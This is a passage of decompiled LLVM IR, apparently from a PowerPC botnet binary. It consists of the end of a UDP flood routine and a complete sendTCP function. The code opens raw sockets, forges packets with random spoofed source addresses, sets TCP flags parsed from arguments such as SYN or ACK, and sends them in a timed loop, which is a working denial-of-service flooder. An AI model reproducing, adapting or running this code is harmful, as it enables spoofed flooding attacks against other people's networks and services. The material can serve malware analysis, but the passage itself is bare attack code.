  store i32 %v2_100050b0, i32* %v4_100050b8, align 4
  %v1_100050c8 = add i32 %v3_100050b8, 23
  %v1_100050cc = and i32 %v1_100050c8, -16
  %v1_100050ec = add i32 %v1_100050cc, 20
  %v5_100050f0 = inttoptr i32 %v1_100050ec to i16*
  %v3_100050f4 = load i32, i32* %stack_var_-108, align 4
  %v1_100050fc = call i32 @GetRandomIP(i32 %storemerge10)
  store i32 %v1_100050fc, i32* @r3, align 4
  %v1_10005108 = call i32 @htonl(i32 %v1_100050fc)
  %v1_10005114 = add i32 %arg5, 8
  %v6_1000512c = inttoptr i32 %v1_100050cc to i32*
  %v7_1000512c = call i32 @makeIPPacket(i32* %v6_1000512c, i32 %v3_100050f4, i32 %v1_10005108, i32 17, i32 %v1_10005114, i32 %arg5)
  %v1_1000513c = urem i32 %v1_10005114, 65536
  store i32 %v1_1000513c, i32* @r3, align 4
  %v1_10005144 = call i32 @htons(i32 %v1_1000513c)
  %sext = mul i32 %v1_10005144, 65536
  %v1_10005148 = sdiv i32 %sext, 65536
  %v1_10005150 = trunc i32 %v1_10005148 to i16
  %v3_10005150 = add i32 %v1_100050cc, 24
  %v4_10005150 = inttoptr i32 %v3_10005150 to i16*
  store i16 %v1_10005150, i16* %v4_10005150, align 8
  %v0_10005154 = call i32 @rand_cmwc()
  %v1_10005164 = trunc i32 %v0_10005154 to i16
  store i16 %v1_10005164, i16* %v5_100050f0, align 4
  br i1 %v3_10004d6c, label %dec_label_pc_10005174, label %dec_label_pc_10005188

dec_label_pc_10005174:                            ; preds = %dec_label_pc_10005090
  %v0_10005174 = call i32 @rand_cmwc()
  %extract.t87 = trunc i32 %v0_10005174 to i16
  br label %dec_label_pc_100051a0

dec_label_pc_10005188:                            ; preds = %dec_label_pc_10005090
  %v1_1000518c = urem i32 %arg2, 65536
  store i32 %v1_1000518c, i32* @r3, align 4
  %v1_10005194 = call i32 @htons(i32 %v1_1000518c)
  %extract.t = trunc i32 %v1_10005194 to i16
  br label %dec_label_pc_100051a0

dec_label_pc_100051a0:                            ; preds = %dec_label_pc_10005174, %dec_label_pc_10005188
  %storemerge78.off0 = phi i16 [ %extract.t, %dec_label_pc_10005188 ], [ %extract.t87, %dec_label_pc_10005174 ]
  %v1_10005280.pre-phi = phi i32 [ %v1_1000518c, %dec_label_pc_10005188 ], [ 0, %dec_label_pc_10005174 ]
  %v3_100051a8 = add i32 %v1_100050cc, 22
  %v4_100051a8 = inttoptr i32 %v3_100051a8 to i16*
  store i16 %storemerge78.off0, i16* %v4_100051a8, align 2
  %v3_100051b4 = add i32 %v1_100050cc, 26
  %v4_100051b4 = inttoptr i32 %v3_100051b4 to i16*
  store i16 0, i16* %v4_100051b4, align 2
  %v1_100051bc = add i32 %v1_100050cc, 28
  %v2_100051c8 = call i32 @makeRandomStr(i32 %v1_100051bc, i32 %arg5)
  %v1_100051d8 = or i32 %v1_100050cc, 2
  %v2_100051d8 = inttoptr i32 %v1_100051d8 to i16*
  %v3_100051d8 = load i16, i16* %v2_100051d8, align 2
  %v4_100051d8 = zext i16 %v3_100051d8 to i32
  %v5_100051e8 = inttoptr i32 %v1_100050cc to i16*
  %v6_100051e8 = call i32 @csum(i16* %v5_100051e8, i32 %v4_100051d8, i32 %v1_100050cc, i32 17, i32 %v1_10005114)
  %sext4 = mul i32 %v6_100051e8, 65536
  %v1_100051ec = sdiv i32 %sext4, 65536
  %v1_100051f4 = trunc i32 %v1_100051ec to i16
  %v3_100051f4 = or i32 %v1_100050cc, 10
  %v4_100051f4 = inttoptr i32 %v3_100051f4 to i16*
  store i16 %v1_100051f4, i16* %v4_100051f4, align 2
  store i32 268456448, i32* @lr, align 4
  %v1_100051fc = call i32 @__GI_time(i32 0)
  %v2_10005208 = add i32 %v1_100051fc, %arg3
  %v3_100052b0 = or i32 %v1_100050cc, 4
  %v4_100052b0 = inttoptr i32 %v3_100052b0 to i16*
  %v2_100052d0 = or i32 %v1_100050cc, 12
  %v3_100052d0 = inttoptr i32 %v2_100052d0 to i32*
  %v1_10005354 = mul i32 %v0_10004d5c, 1000
  br label %dec_label_pc_10005224.outer

dec_label_pc_10005224.outer:                      ; preds = %dec_label_pc_10005224.outer.backedge, %dec_label_pc_100051a0
  %stack_var_-56.0.ph = phi i32 [ 0, %dec_label_pc_100051a0 ], [ %storemerge26, %dec_label_pc_10005224.outer.backedge ]
  %stack_var_-52.0.ph = phi i32 [ 0, %dec_label_pc_100051a0 ], [ %v1_10005338, %dec_label_pc_10005224.outer.backedge ]
  br label %dec_label_pc_10005224

dec_label_pc_10005224:                            ; preds = %dec_label_pc_10005224.outer, %dec_label_pc_10005328
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_10005328 ], [ %stack_var_-52.0.ph, %dec_label_pc_10005224.outer ]
  store i32 268456520, i32* @lr, align 4
  %v7_10005244 = call i32 @__libc_sendto(i32 %v3_10004f7c, i32 %v1_100050cc, i32 %v1_10005094, i32 0, i32 %v2_10004da0, i32 16, i32 %v2_10004da0)
  %v0_10005248 = call i32 @rand_cmwc()
  %v1_10005258 = trunc i32 %v0_10005248 to i16
  store i16 %v1_10005258, i16* %v5_100050f0, align 4
  br i1 %v3_10004d6c, label %dec_label_pc_10005268, label %dec_label_pc_1000527c

dec_label_pc_10005268:                            ; preds = %dec_label_pc_10005224
  %v0_10005268 = call i32 @rand_cmwc()
  %extract.t89 = trunc i32 %v0_10005268 to i16
  br label %dec_label_pc_10005294

dec_label_pc_1000527c:                            ; preds = %dec_label_pc_10005224
  store i32 %v1_10005280.pre-phi, i32* @r3, align 4
  %v1_10005288 = call i32 @htons(i32 %v1_10005280.pre-phi)
  %extract.t88 = trunc i32 %v1_10005288 to i16
  br label %dec_label_pc_10005294

dec_label_pc_10005294:                            ; preds = %dec_label_pc_10005268, %dec_label_pc_1000527c
  %storemerge80.off0 = phi i16 [ %extract.t88, %dec_label_pc_1000527c ], [ %extract.t89, %dec_label_pc_10005268 ]
  store i16 %storemerge80.off0, i16* %v4_100051a8, align 2
  %v0_100052a0 = call i32 @rand_cmwc()
  %v1_100052b0 = trunc i32 %v0_100052a0 to i16
  store i16 %v1_100052b0, i16* %v4_100052b0, align 4
  %v1_100052b8 = call i32 @GetRandomIP(i32 %storemerge10)
  store i32 %v1_100052b8, i32* @r3, align 4
  %v1_100052c4 = call i32 @htonl(i32 %v1_100052b8)
  store i32 %v1_100052c4, i32* %v3_100052d0, align 4
  %v3_100052e0 = load i16, i16* %v2_100051d8, align 2
  %v4_100052e0 = zext i16 %v3_100052e0 to i32
  %v6_100052f0 = call i32 @csum(i16* %v5_100051e8, i32 %v4_100052e0, i32 %v1_100050cc, i32 0, i32 %v2_10004da0)
  %v1_100052fc = trunc i32 %v6_100052f0 to i16
  store i16 %v1_100052fc, i16* %v4_100051f4, align 2
  %v4_10005308 = icmp eq i32 %stack_var_-52.0, %arg6
  br i1 %v4_10005308, label %dec_label_pc_10005310, label %dec_label_pc_10005334

dec_label_pc_10005310:                            ; preds = %dec_label_pc_10005294
  store i32 268456728, i32* @lr, align 4
  %v1_10005314 = call i32 @__GI_time(i32 0)
  %v3_10005320 = icmp sgt i32 %v1_10005314, %v2_10005208
  br i1 %v3_10005320, label %dec_label_pc_1000537c, label %dec_label_pc_10005328

dec_label_pc_10005328:                            ; preds = %dec_label_pc_10005310
  br label %dec_label_pc_10005224

dec_label_pc_10005334:                            ; preds = %dec_label_pc_10005294
  %v1_10005338 = add i32 %stack_var_-52.0, 1
  %v4_10005348 = icmp eq i32 %stack_var_-56.0.ph, %arg7
  br i1 %v4_10005348, label %dec_label_pc_10005350, label %dec_label_pc_1000536c

dec_label_pc_10005350:                            ; preds = %dec_label_pc_10005334
  store i32 ptrtoint ([3 x i8]* @global_var_10005360.466 to i32), i32* @lr, align 4
  %v2_1000535c = call i32 @usleep(i32 %v1_10005354, i32 %arg7)
  br label %dec_label_pc_10005224.outer.backedge

dec_label_pc_10005224.outer.backedge:             ; preds = %dec_label_pc_10005350, %dec_label_pc_1000536c
  %storemerge26 = phi i32 [ %v1_10005370, %dec_label_pc_1000536c ], [ 0, %dec_label_pc_10005350 ]
  br label %dec_label_pc_10005224.outer

dec_label_pc_1000536c:                            ; preds = %dec_label_pc_10005334
  %v1_10005370 = add i32 %stack_var_-56.0.ph, 1
  br label %dec_label_pc_10005224.outer.backedge

dec_label_pc_1000537c:                            ; preds = %dec_label_pc_10005310, %dec_label_pc_10004fe4, %dec_label_pc_10004f94
  %v0_100053a431 = phi i32 [ %v5_10004ffc, %dec_label_pc_10004fe4 ], [ %v5_10004fac, %dec_label_pc_10004f94 ], [ %v1_10005314, %dec_label_pc_10005310 ]
  br label %dec_label_pc_1000538c

dec_label_pc_1000538c:                            ; preds = %dec_label_pc_10004efc, %dec_label_pc_10004da0, %dec_label_pc_10004e30, %dec_label_pc_10004e10, %dec_label_pc_1000537c
  %v0_100053a4 = phi i32 [ %v4_10004db0, %dec_label_pc_10004da0 ], [ 0, %dec_label_pc_10004e30 ], [ %v5_10004e28, %dec_label_pc_10004e10 ], [ %v0_100053a431, %dec_label_pc_1000537c ], [ %v1_10004f00, %dec_label_pc_10004efc ]
  ret i32 %v0_100053a4

; uselistorder directives
  uselistorder i32 %v1_10005280.pre-phi, { 1, 0 }
  uselistorder i32 %v1_1000518c, { 2, 1, 0 }
  uselistorder i32 %v1_1000513c, { 1, 0 }
  uselistorder i32 %v1_10005114, { 2, 0, 1 }
  uselistorder i32 %v1_100050cc, { 10, 3, 1, 2, 4, 11, 0, 5, 6, 7, 8, 9, 12, 13 }
  uselistorder i32 %v2_10004da0, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v1_10004d8c, { 1, 0 }
  uselistorder i32* %stack_var_-112, { 1, 0 }
  uselistorder i32* %stack_var_-108, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder i32 (i32, i32)* @usleep, { 1, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 1, 0 }
  uselistorder i32 %arg7, { 1, 3, 0, 2 }
  uselistorder i32 %arg5, { 1, 3, 2, 5, 4, 0, 6, 7 }
  uselistorder label %dec_label_pc_1000538c, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10005224.outer.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10005294, { 1, 0 }
  uselistorder label %dec_label_pc_10005224, { 1, 0 }
  uselistorder label %dec_label_pc_100051a0, { 1, 0 }
  uselistorder label %dec_label_pc_10005090, { 1, 0 }
  uselistorder label %dec_label_pc_10005010, { 1, 0 }
  uselistorder label %dec_label_pc_10004eac.outer.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10004efc, { 1, 0 }
  uselistorder label %dec_label_pc_10004eac, { 1, 0 }
  uselistorder label %dec_label_pc_10004da0, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100053a8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100053a8, i32* %stack_var_-128, align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v3_100053f8 = icmp eq i32 %arg2, 0
  br i1 %v3_100053f8, label %dec_label_pc_10005400, label %dec_label_pc_10005414

dec_label_pc_10005400:                            ; preds = %entry
  %v0_10005400 = call i32 @rand_cmwc()
  br label %dec_label_pc_1000542c

dec_label_pc_10005414:                            ; preds = %entry
  %v1_10005418 = urem i32 %arg2, 65536
  store i32 %v1_10005418, i32* @r3, align 4
  %v1_10005420 = call i32 @htons(i32 %v1_10005418)
  br label %dec_label_pc_1000542c

dec_label_pc_1000542c:                            ; preds = %dec_label_pc_10005400, %dec_label_pc_10005414
  %v2_1000542c = ptrtoint i32* %stack_var_-92 to i32
  %v4_1000543c = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-88, i32 %v2_1000542c)
  %v3_10005444 = icmp eq i32 %v4_1000543c, 0
  br i1 %v3_10005444, label %dec_label_pc_10005450, label %dec_label_pc_100059d4

dec_label_pc_10005450:                            ; preds = %dec_label_pc_1000542c
  store i32 268457080, i32* @lr, align 4
  %v3_10005474 = call i32 @socket(i32 2, i32 3, i32 6)
  %v3_10005484 = icmp eq i32 %v3_10005474, 0
  br i1 %v3_10005484, label %dec_label_pc_1000548c, label %dec_label_pc_100054ac

dec_label_pc_1000548c:                            ; preds = %dec_label_pc_10005450
  %v3_10005490 = load i32, i32* @global_var_10024a28.27, align 4
  store i32 ptrtoint (i32* @global_var_100054a8.467 to i32), i32* @lr, align 4
  %v5_100054a4 = call i32 @Rootsprintf(i32 %v3_10005490, i32 ptrtoint ([27 x i8]* @global_var_10011fbc.458 to i32), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  br label %dec_label_pc_100059d4

dec_label_pc_100054ac:                            ; preds = %dec_label_pc_10005450
  store i32 1, i32* %stack_var_-76, align 4
  %v2_100054b4 = ptrtoint i32* %stack_var_-76 to i32
  store i32 268457168, i32* @lr, align 4
  %v5_100054cc = call i32 @__GI_setsockopt(i32 %v3_10005474, i32 0, i32 3, i32 %v2_100054b4, i32 4)
  %tmp59 = icmp sgt i32 %v5_100054cc, -1
  br i1 %tmp59, label %dec_label_pc_100054fc, label %dec_label_pc_100054dc

dec_label_pc_100054dc:                            ; preds = %dec_label_pc_100054ac
  %v3_100054e0 = load i32, i32* @global_var_10024a28.27, align 4
  store i32 ptrtoint (i32* @global_var_100054f8.468 to i32), i32* @lr, align 4
  %v5_100054f4 = call i32 @Rootsprintf(i32 %v3_100054e0, i32 ptrtoint ([33 x i8]* @global_var_10011fd8.463 to i32), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  br label %dec_label_pc_100059d4

dec_label_pc_100054fc:                            ; preds = %dec_label_pc_100054ac
  %v3_10005500 = icmp eq i32 %arg4, 0
  br i1 %v3_10005500, label %dec_label_pc_1000552c, label %dec_label_pc_10005514

dec_label_pc_10005514:                            ; preds = %dec_label_pc_100054fc
  %v1_10005518 = sub i32 32, %arg4
  %v2_10005520 = urem i32 %v1_10005518, 64
  %v1_10005524 = shl i32 -1, %v2_10005520
  br label %dec_label_pc_1000552c

dec_label_pc_1000552c:                            ; preds = %dec_label_pc_100054fc, %dec_label_pc_10005514
  %storemerge9 = phi i32 [ %v1_10005524, %dec_label_pc_10005514 ], [ 0, %dec_label_pc_100054fc ]
  %v1_10005530 = add i32 %arg6, 40
  %v1_10005540 = add i32 %arg6, 70
  %v1_10005544 = and i32 %v1_10005540, -16
  %v2_1000554c = load i32, i32* %stack_var_-128, align 4
  %v1_10005554 = load i32, i32* @r1, align 4
  %v3_10005554 = sub i32 %v1_10005554, %v1_10005544
  %v4_10005554 = inttoptr i32 %v3_10005554 to i32*
  store i32 %v2_1000554c, i32* %v4_10005554, align 4
  %v1_10005564 = add i32 %v3_10005554, 23
  %v1_10005568 = and i32 %v1_10005564, -16
  %v1_10005588 = add i32 %v1_10005568, 20
  %v5_1000558c = inttoptr i32 %v1_10005588 to i16*
  %v3_10005590 = load i32, i32* %stack_var_-88, align 4
  %v1_10005598 = call i32 @GetRandomIP(i32 %storemerge9)
  store i32 %v1_10005598, i32* @r3, align 4
  %v1_100055a4 = call i32 @htonl(i32 %v1_10005598)
  %v1_100055b0 = add i32 %arg6, 20
  %v6_100055c8 = inttoptr i32 %v1_10005568 to i32*
  %v7_100055c8 = call i32 @makeIPPacket(i32* %v6_100055c8, i32 %v3_10005590, i32 %v1_100055a4, i32 6, i32 %v1_100055b0, i32 %arg6)
  %v0_100055cc = call i32 @rand_cmwc()
  %v1_100055dc = trunc i32 %v0_100055cc to i16
  store i16 %v1_100055dc, i16* %v5_1000558c, align 4
  %v0_100055e0 = call i32 @rand_cmwc()
  %v2_100055ec = add i32 %v1_10005568, 24
  %v3_100055ec = inttoptr i32 %v2_100055ec to i32*
  store i32 %v0_100055e0, i32* %v3_100055ec, align 8
  %v2_100055f8 = add i32 %v1_10005568, 28
  %v3_100055f8 = inttoptr i32 %v2_100055f8 to i32*
  store i32 0, i32* %v3_100055f8, align 4
  %v1_10005600 = add i32 %v1_10005568, 32
  %v2_10005600 = inttoptr i32 %v1_10005600 to i32*
  %v1_10005608 = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  %v2_1000560c = add i32 %v1_10005568, 32
  %v3_1000560c = inttoptr i32 %v2_1000560c to i32*
  store i32 %v1_10005608, i32* %v3_1000560c, align 16
  store i32 ptrtoint ([4 x i8]* @global_var_10011ffc.469 to i32), i32* @r4, align 4
  %v3_10005620 = inttoptr i32 %arg5 to i8*
  %v4_10005620 = call i32 @__GI_strcoll(i8* %v3_10005620, i32 ptrtoint ([4 x i8]* @global_var_10011ffc.469 to i32))
  %v3_10005628 = icmp eq i32 %v4_10005620, 0
  br i1 %v3_10005628, label %dec_label_pc_10005630, label %dec_label_pc_10005684

dec_label_pc_10005630:                            ; preds = %dec_label_pc_1000552c
  %v3_10005634 = load i32, i32* %v2_10005600, align 16
  %v1_10005678 = or i32 %v3_10005634, 2031616
  store i32 %v1_10005678, i32* %v2_10005600, align 16
  br label %dec_label_pc_100057ec

dec_label_pc_10005684:                            ; preds = %dec_label_pc_1000552c
  store i32 ptrtoint (i32* @global_var_10012000.470 to i32), i32* @r4, align 4
  store i32 268457624, i32* @lr, align 4
  %v4_10005694 = call i32 @__GI_strtok(i32 %arg5, i32 ptrtoint (i32* @global_var_10012000.470 to i32), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  %v3_100057e418 = icmp eq i32 %v4_10005694, 0
  br i1 %v3_100057e418, label %dec_label_pc_100057ec, label %dec_label_pc_100056a4

dec_label_pc_100056a4:                            ; preds = %dec_label_pc_10005684, %dec_label_pc_100057c8
  %storemerge1319 = phi i32 [ %v4_100057d4, %dec_label_pc_100057c8 ], [ %v4_10005694, %dec_label_pc_10005684 ]
  store i32 ptrtoint ([4 x i8]* @global_var_10012004.471 to i32), i32* @r4, align 4
  %v3_100056b4 = inttoptr i32 %storemerge1319 to i8*
  %v4_100056b4 = call i32 @__GI_strcoll(i8* %v3_100056b4, i32 ptrtoint ([4 x i8]* @global_var_10012004.471 to i32))
  %v3_100056bc = icmp eq i32 %v4_100056b4, 0
  br i1 %v3_100056bc, label %dec_label_pc_100056c4, label %dec_label_pc_100056d8

dec_label_pc_100056c4:                            ; preds = %dec_label_pc_100056a4
  %v3_100056c8 = load i32, i32* %v2_10005600, align 16
  %v1_100056cc = or i32 %v3_100056c8, 131072
  store i32 %v1_100056cc, i32* %v2_10005600, align 16
  br label %dec_label_pc_100057c8

dec_label_pc_100056d8:                            ; preds = %dec_label_pc_100056a4
  store i32 ptrtoint ([4 x i8]* @global_var_10012008.472 to i32), i32* @r4, align 4
  %v4_100056e8 = call i32 @__GI_strcoll(i8* %v3_100056b4, i32 ptrtoint ([4 x i8]* @global_var_10012008.472 to i32))
  %v3_100056f0 = icmp eq i32 %v4_100056e8, 0
  br i1 %v3_100056f0, label %dec_label_pc_100056f8, label %dec_label_pc_1000570c

dec_label_pc_100056f8:                            ; preds = %dec_label_pc_100056d8
  %v3_100056fc = load i32, i32* %v2_10005600, align 16
  %v1_10005700 = or i32 %v3_100056fc, 262144
  store i32 %v1_10005700, i32* %v2_10005600, align 16
  br label %dec_label_pc_100057c8

dec_label_pc_1000570c:                            ; preds = %dec_label_pc_100056d8
  store i32 ptrtoint ([4 x i8]* @global_var_1001200c.473 to i32), i32* @r4, align 4
  %v4_1000571c = call i32 @__GI_strcoll(i8* %v3_100056b4, i32 ptrtoint ([4 x i8]* @global_var_1001200c.473 to i32))
  %v3_10005724 = icmp eq i32 %v4_1000571c, 0
  br i1 %v3_10005724, label %dec_label_pc_1000572c, label %dec_label_pc_10005740

dec_label_pc_1000572c:                            ; preds = %dec_label_pc_1000570c
  %v3_10005730 = load i32, i32* %v2_10005600, align 16
  %v1_10005734 = or i32 %v3_10005730, 65536
  store i32 %v1_10005734, i32* %v2_10005600, align 16
  br label %dec_label_pc_100057c8

dec_label_pc_10005740:                            ; preds = %dec_label_pc_1000570c
  store i32 ptrtoint ([4 x i8]* @global_var_10012010.474 to i32), i32* @r4, align 4
  %v4_10005750 = call i32 @__GI_strcoll(i8* %v3_100056b4, i32 ptrtoint ([4 x i8]* @global_var_10012010.474 to i32))
  %v3_10005758 = icmp eq i32 %v4_10005750, 0
  br i1 %v3_10005758, label %dec_label_pc_10005760, label %dec_label_pc_10005774

dec_label_pc_10005760:                            ; preds = %dec_label_pc_10005740
  %v3_10005764 = load i32, i32* %v2_10005600, align 16
  %v1_10005768 = or i32 %v3_10005764, 1048576
  store i32 %v1_10005768, i32* %v2_10005600, align 16
  br label %dec_label_pc_100057c8

dec_label_pc_10005774:                            ; preds = %dec_label_pc_10005740
  store i32 ptrtoint ([4 x i8]* @global_var_10012014.475 to i32), i32* @r4, align 4
  %v4_10005784 = call i32 @__GI_strcoll(i8* %v3_100056b4, i32 ptrtoint ([4 x i8]* @global_var_10012014.475 to i32))
  %v3_1000578c = icmp eq i32 %v4_10005784, 0
  br i1 %v3_1000578c, label %dec_label_pc_10005794, label %dec_label_pc_100057a8

dec_label_pc_10005794:                            ; preds = %dec_label_pc_10005774
  %v3_10005798 = load i32, i32* %v2_10005600, align 16
  %v1_1000579c = or i32 %v3_10005798, 524288
  store i32 %v1_1000579c, i32* %v2_10005600, align 16
  br label %dec_label_pc_100057c8

dec_label_pc_100057a8:                            ; preds = %dec_label_pc_10005774
  %v3_100057ac = load i32, i32* @global_var_10024a28.27, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100057c8.477 to i32), i32* @lr, align 4
  %v5_100057c4 = call i32 @Rootsprintf(i32 %v3_100057ac, i32 ptrtoint ([18 x i8]* @global_var_10012018.476 to i32), i32 %storemerge1319)
  br label %dec_label_pc_100057c8

dec_label_pc_100057c8:                            ; preds = %dec_label_pc_10005794, %dec_label_pc_10005760, %dec_label_pc_1000572c, %dec_label_pc_100056f8, %dec_label_pc_100056c4, %dec_label_pc_100057a8
  store i32 ptrtoint (i32* @global_var_10012000.470 to i32), i32* @r4, align 4
  store i32 268457944, i32* @lr, align 4
  %v4_100057d4 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10012000.470 to i32), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  %v3_100057e4 = icmp eq i32 %v4_100057d4, 0
  br i1 %v3_100057e4, label %dec_label_pc_100057ec, label %dec_label_pc_100056a4

dec_label_pc_100057ec:                            ; preds = %dec_label_pc_100057c8, %dec_label_pc_10005684, %dec_label_pc_10005630
  %v0_100057ec = call i32 @rand_cmwc()
  %v1_100057fc = trunc i32 %v0_100057ec to i16
  %v3_100057fc = add i32 %v1_10005568, 34
  %v4_100057fc = inttoptr i32 %v3_100057fc to i16*
  store i16 %v1_100057fc, i16* %v4_100057fc, align 2
  %v3_10005808 = add i32 %v1_10005568, 36
  %v4_10005808 = inttoptr i32 %v3_10005808 to i16*
  store i16 0, i16* %v4_10005808, align 4
  %v3_10005814 = add i32 %v1_10005568, 38
  %v4_10005814 = inttoptr i32 %v3_10005814 to i16*
  store i16 0, i16* %v4_10005814, align 2
  br i1 %v3_100053f8, label %dec_label_pc_10005824, label %dec_label_pc_10005838

dec_label_pc_10005824:                            ; preds = %dec_label_pc_100057ec
  %v0_10005824 = call i32 @rand_cmwc()
  %extract.t63 = trunc i32 %v0_10005824 to i16
  br label %dec_label_pc_10005850

dec_label_pc_10005838:                            ; preds = %dec_label_pc_100057ec
  %v1_1000583c = urem i32 %arg2, 65536
  store i32 %v1_1000583c, i32* @r3, align 4
  %v1_10005844 = call i32 @htons(i32 %v1_1000583c)
  %extract.t = trunc i32 %v1_10005844 to i16
  br label %dec_label_pc_10005850

dec_label_pc_10005850:                            ; preds = %dec_label_pc_10005824, %dec_label_pc_10005838
  %storemerge60.off0 = phi i16 [ %extract.t, %dec_label_pc_10005838 ], [ %extract.t63, %dec_label_pc_10005824 ]
  %v3_10005858 = add i32 %v1_10005568, 22
  %v4_10005858 = inttoptr i32 %v3_10005858 to i16*
  store i16 %storemerge60.off0, i16* %v4_10005858, align 2
  store i32 268458088, i32* @lr, align 4
  %v3_10005864 = inttoptr i32 %v1_10005588 to i32*
  %v4_10005864 = call i32 @tcpcsum(i32 %v1_10005568, i32* %v3_10005864, i32 %v1_10005588)
  %v1_10005870 = trunc i32 %v4_10005864 to i16
  store i16 %v1_10005870, i16* %v4_10005808, align 4
  %v1_10005880 = or i32 %v1_10005568, 2
  %v2_10005880 = inttoptr i32 %v1_10005880 to i16*
  %v3_10005880 = load i16, i16* %v2_10005880, align 2
  %v4_10005880 = zext i16 %v3_10005880 to i32
  %v5_10005890 = inttoptr i32 %v1_10005568 to i16*
  %v6_10005890 = call i32 @csum(i16* %v5_10005890, i32 %v4_10005880, i32 %v1_10005568, i32 6, i32 %v1_100055b0)
  %sext3 = mul i32 %v6_10005890, 65536
  %v1_10005894 = sdiv i32 %sext3, 65536
  %v1_1000589c = trunc i32 %v1_10005894 to i16
  %v3_1000589c = or i32 %v1_10005568, 10
  %v4_1000589c = inttoptr i32 %v3_1000589c to i16*
  store i16 %v1_1000589c, i16* %v4_1000589c, align 2
  store i32 268458152, i32* @lr, align 4
  %v1_100058a4 = call i32 @__GI_time(i32 0)
  %v2_100058b0 = add i32 %v1_100058a4, %arg3
  %v2_10005904 = or i32 %v1_10005568, 12
  %v3_10005904 = inttoptr i32 %v2_10005904 to i32*
  %v3_10005918 = or i32 %v1_10005568, 4
  %v4_10005918 = inttoptr i32 %v3_10005918 to i16*
  br label %dec_label_pc_100058c4

dec_label_pc_100058c4:                            ; preds = %dec_label_pc_100058c4.backedge, %dec_label_pc_10005850
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_10005850 ], [ %storemerge22, %dec_label_pc_100058c4.backedge ]
  store i32 268458216, i32* @lr, align 4
  %v7_100058e4 = call i32 @__libc_sendto(i32 %v3_10005474, i32 %v1_10005568, i32 %v1_10005530, i32 0, i32 %v2_1000542c, i32 16, i32 %v2_1000542c)
  %v1_100058ec = call i32 @GetRandomIP(i32 %storemerge9)
  store i32 %v1_100058ec, i32* @r3, align 4
  %v1_100058f8 = call i32 @htonl(i32 %v1_100058ec)
  store i32 %v1_100058f8, i32* %v3_10005904, align 4
  %v0_10005908 = call i32 @rand_cmwc()
  %v1_10005918 = trunc i32 %v0_10005908 to i16
  store i16 %v1_10005918, i16* %v4_10005918, align 4
  %v0_1000591c = call i32 @rand_cmwc()
  store i32 %v0_1000591c, i32* %v3_100055ec, align 8
  %v0_1000592c = call i32 @rand_cmwc()
  %v1_1000593c = trunc i32 %v0_1000592c to i16
  store i16 %v1_1000593c, i16* %v5_1000558c, align 4
  store i16 0, i16* %v4_10005808, align 4
  store i32 268458328, i32* @lr, align 4
  %v4_10005954 = call i32 @tcpcsum(i32 %v1_10005568, i32* %v3_10005864, i32 %v1_10005588)
  %v1_10005960 = trunc i32 %v4_10005954 to i16
  store i16 %v1_10005960, i16* %v4_10005808, align 4
  %v3_10005970 = load i16, i16* %v2_10005880, align 2
  %v4_10005970 = zext i16 %v3_10005970 to i32
  %v6_10005980 = call i32 @csum(i16* %v5_10005890, i32 %v4_10005970, i32 %v1_10005568, i32 0, i32 %v2_1000542c)
  %v1_1000598c = trunc i32 %v6_10005980 to i16
  store i16 %v1_1000598c, i16* %v4_1000589c, align 2
  %v4_10005998 = icmp eq i32 %stack_var_-44.0, %arg7
  br i1 %v4_10005998, label %dec_label_pc_100059a0, label %dec_label_pc_100059c4

dec_label_pc_100059a0:                            ; preds = %dec_label_pc_100058c4
  store i32 268458408, i32* @lr, align 4
  %v1_100059a4 = call i32 @__GI_time(i32 0)
  %v3_100059b0 = icmp sgt i32 %v1_100059a4, %v2_100058b0
  br i1 %v3_100059b0, label %dec_label_pc_100059d4, label %dec_label_pc_100058c4.backedge

dec_label_pc_100058c4.backedge:                   ; preds = %dec_label_pc_100059a0, %dec_label_pc_100059c4
  %storemerge22 = phi i32 [ %v1_100059c8, %dec_label_pc_100059c4 ], [ 0, %dec_label_pc_100059a0 ]
  br label %dec_label_pc_100058c4

dec_label_pc_100059c4:                            ; preds = %dec_label_pc_100058c4
  %v1_100059c8 = add i32 %stack_var_-44.0, 1
  br label %dec_label_pc_100058c4.backedge

dec_label_pc_100059d4:                            ; preds = %dec_label_pc_100059a0, %dec_label_pc_1000542c, %dec_label_pc_100054dc, %dec_label_pc_1000548c
  %v0_100059fc = phi i32 [ %v4_1000543c, %dec_label_pc_1000542c ], [ %v5_100054f4, %dec_label_pc_100054dc ], [ %v5_100054a4, %dec_label_pc_1000548c ], [ %v1_100059a4, %dec_label_pc_100059a0 ]
  ret i32 %v0_100059fc

; uselistorder directives
  uselistorder i32 %v1_1000583c, { 1, 0 }
  uselistorder i32 %v4_100057d4, { 1, 0 }
  uselistorder i32 %storemerge1319, { 1, 0 }
  uselistorder i32* %v2_10005600, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i32 %v1_100055b0, { 1, 0 }
  uselistorder i32 %v1_10005588, { 0, 2, 1, 3 }
  uselistorder i32 %v1_10005568, { 14, 15, 4, 2, 3, 5, 16, 1, 6, 17, 7, 8, 9, 10, 0, 11, 12, 13, 18, 19 }
  uselistorder i32 %v2_1000542c, { 1, 3, 2, 0 }
  uselistorder i32 %v1_10005418, { 1, 0 }
